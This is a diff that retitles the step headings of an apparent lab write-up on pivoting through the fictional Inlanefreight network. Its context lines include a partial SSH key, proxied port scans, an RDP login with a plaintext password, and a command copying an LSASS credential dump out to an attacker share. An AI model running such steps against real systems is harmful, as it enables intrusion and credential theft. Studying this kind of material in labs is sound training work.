@@ -4406,7 +4406,7 @@ A team member started a Penetration Test against the Inlanefreight environment b
 <summary><h2>Steps</h2></summary>
 
 <details>
-<summary><h3>Step 1</h3></summary>
+<summary><h3>Step 1 - Initial Reconnaissance & SSH Key Extraction</h3></summary>
 
 We start the engagement in the initial information gathering (reconnaissance) phase. By accessing the exposed web shell, our primary goal is to find valid access vectors to move laterally or establish persistence on the network.
 
@@ -4588,7 +4588,7 @@ MtiE8P6v7eaf1XAAAAHHdlYmFkbWluQGlubGFuZWZyZWlnaHQubG9jYWwBAgMEBQY=
 </details>
 
 <details>
-<summary><h3>Step 2</h3></summary>
+<summary><h3>Step 2 - Securing the SSH Private Key</h3></summary>
 
 **Copy the contents to our attack box**
 
@@ -4621,7 +4621,7 @@ chmod 600 id_rsa
 </details>
 
 <details>
-<summary><h3>Step 3</h3></summary>
+<summary><h3>Step 3 - Establishing SSH Tunnel & Dynamic Port Forwarding</h3></summary>
 
 **Establish SSH Session with Dynamic Port Forwarding**
 
@@ -4668,7 +4668,7 @@ webadmin@inlanefreight:~$
 </details>
 
 <details>
-<summary><h3>Step 4</h3></summary>
+<summary><h3>Step 4 - Internal Network Enumeration & Host Discovery</h3></summary>
 
 **Internal Network Interface Enumeration**
 
@@ -4767,7 +4767,7 @@ for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "64 bytes" &); done
 </details>
 
 <details>
-<summary><h3>Step 5</h3></summary>
+<summary><h3>Internal Service Enumeration via SOCKS Proxy</h3></summary>
 
 We need to scan the newly discovered Windows machine for accessible services, but since it resides on an internal network, we must route our scanning tools through the SSH tunnel we created.
 
@@ -4895,7 +4895,7 @@ for port in 22 80 135 139 445 3389; do proxychains nc -zv 172.16.5.35 $port 2>&1
 </details>
 
 <details>
-<summary><h3>Step 6</h3></summary>
+<summary><h3>Step 6 - First Pivot: RDP Access via SSH Tunnel</h3></summary>
 
 We leverage our established SSH proxy and the harvested credentials to gain a graphical Remote Desktop (RDP) session on the internal Windows server.
 
@@ -4944,7 +4944,7 @@ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert:ignor
 </details>
 
 <details>
-<summary><h3>Step 7</h3></summary>
+<summary><h3>Step 7 - Post-Exploitation: First Internal Flag Retrieval</h3></summary>
 
 Now that we have successfully landed on the target Windows machine through our RDP session, we move to secure our objective for this phase of the engagement.
 
@@ -5041,7 +5041,7 @@ copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\kali_share\
 </details>
 
 <details>
-<summary><h3>Step 9 - Extracting the credentials</h3></summary>
+<summary><h3>Step 9 - Offline Credential Extraction via Pypykatz</h3></summary>
 
 We analyze the exfiltrated LSASS memory dump offline on our attack host to safely extract compromised credentials.
 
@@ -5126,7 +5126,7 @@ We scan the parsed memory sections and identify an active logon session for a ne
 </details>
 
 <details>
-<summary><h3>Step 10 - Second Pivot Network Enumeration</h3></summary>
+<summary><h3>Step 10 - Second Pivot Reconnaissance & Target Identification</h3></summary>
 
 We need to map out the next layer of the internal network from our new vantage point on the compromised Windows server.
 
@@ -5310,7 +5310,7 @@ DNS request timed out.
 </details>
 
 <details>
-<summary><h3>Step 11 - Second Pivot Network Enumeration</h3></summary>
+<summary><h3>Step 11 - Deep Internal Network Scanning & Service Discovery</h3></summary>
 
 We continue our reconnaissance of the newly discovered `172.16.6.0/24` subnet. Since we do not have our standard scanning tools (like Nmap) available on this compromised Windows server, we must "Live off the Land" using built-in operating system commands.
 
@@ -5389,7 +5389,7 @@ for /L %i in (1,1,254) do @powershell -c "if ((New-Object System.Net.Sockets.Tcp
 </details>
 
 <details>
-<summary><h3>Step 12</h3></summary>
+<summary><h3>Step 12 - Executing the Double Pivot via Nested RDP</h3></summary>
 
 We need to log into the newly discovered target (`172.16.6.25`) using the `vfrank` credentials we extracted earlier, but doing this from an already compromised command line requires a specific workaround.
 
@@ -5456,7 +5456,7 @@ mstsc /v:172.16.6.25
 </details>
 
 <details>
-<summary><h3>Step 13</h3></summary>
+<summary><h3>Step 13 - Post-Exploitation: Second Internal Flag Retrieval</h3></summary>
 
 Having successfully established our nested RDP session and landed on the secondary internal host, our immediate priority is to verify our access and secure the objective for this specific machine.
 
@@ -5498,7 +5498,7 @@ N3tw0rk-H0pp1ng-f0R-FuN
 </details>
 
 <details>
-<summary><h3>Step 14</h3></summary>
+<summary><h3>Step 14 - Final Assault: Domain Controller Compromise via SMB</h3></summary>
 
 We are now ready for the final assault on the Domain Controller (172.16.10.5), which we identified during our earlier DNS enumeration.
 
